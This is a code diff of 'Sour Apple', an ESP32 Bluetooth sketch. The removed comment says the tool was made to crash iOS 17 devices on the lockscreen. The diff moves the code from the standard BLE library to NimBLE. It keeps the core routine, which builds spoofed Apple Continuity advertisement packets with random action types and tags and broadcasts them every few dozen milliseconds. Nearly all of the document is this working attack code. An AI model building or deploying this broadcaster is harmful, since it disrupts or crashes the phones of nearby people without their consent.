@@ -1,23 +1,20 @@
-// ESP32 Sour Apple made to crash IOS17 devices on the lockscreen. Exploit found by WillyJL and ECTO-1A.
+// ESP32 Sour Apple by RapierXbox
 
 
-#include <BLEDevice.h>
-#include <BLEUtils.h>
-#include <BLEServer.h>
+#include <NimBLEDevice.h>
 
-BLEAdvertising *pAdvertising;
+NimBLEAdvertising *pAdvertising;
 
 void setup() {
-  BLEDevice::init("");
+  NimBLEDevice::init("");
 
-  BLEServer *pServer = BLEDevice::createServer(); // Starting BLE Server
+  NimBLEServer *pServer = NimBLEDevice::createServer();
 
   pAdvertising = pServer->getAdvertising();
-  pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_LOW); // Setting advertisment type for high duty cycle
 }
 
-BLEAdvertisementData getOAdvertisementData() {
-  BLEAdvertisementData randomAdvertisementData = BLEAdvertisementData();
+NimBLEAdvertisementData getOAdvertisementData() {
+  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
   uint8_t packet[17];
   uint8_t size = 17;
   uint8_t i = 0;
@@ -31,25 +28,21 @@ BLEAdvertisementData getOAdvertisementData() {
   packet[i++] = 0xC1;                        // Action Flags
   const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
   packet[i++] = types[rand() % sizeof(types)];  // Action Type
-  packet[i++] = rand() % 256;
-  packet[i++] = rand() % 256;
-  packet[i++] = rand() % 256;   // Authentication Tag
+  esp_fill_random(&packet[i], 3); // Authentication Tag
+  i += 3;   
   packet[i++] = 0x00;  // ???
   packet[i++] = 0x00;  // ???
   packet[i++] =  0x10;  // Type ???
-  packet[i++] = rand() % 256;
-  packet[i++] = rand() % 256;
-  packet[i++] = rand() % 256;
+  esp_fill_random(&packet[i], 3);
 
   randomAdvertisementData.addData(std::string((char *)packet, 17));
   return randomAdvertisementData;
 }
 
 void loop() {
-  delay(45);
-  
-  BLEAdvertisementData advertisementData = getOAdvertisementData(); // Making random packet
-  pAdvertising->setAdvertisementData(advertisementData); // Setting random packet
+  delay(40);
+  NimBLEAdvertisementData advertisementData = getOAdvertisementData();
+  pAdvertising->setAdvertisementData(advertisementData);
   pAdvertising->start();
   delay(20);
   pAdvertising->stop();
